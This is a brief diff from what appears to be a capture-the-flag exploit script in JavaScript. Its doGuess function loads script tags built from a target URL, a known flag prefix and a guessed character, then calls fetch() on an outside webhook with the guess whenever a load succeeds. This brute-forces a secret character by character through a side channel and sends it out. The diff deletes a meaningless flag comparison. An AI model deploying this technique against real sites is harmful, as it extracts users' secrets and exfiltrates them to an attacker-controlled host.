@@ -23,7 +23,6 @@
         
     async function doGuess(g){
         const script = document.createElement("script");
-        if(FLAG+g == FLAG)
         script.src = url+FLAG+g;
         script.onload = () => {
             fetch(whook + FLAG + g);
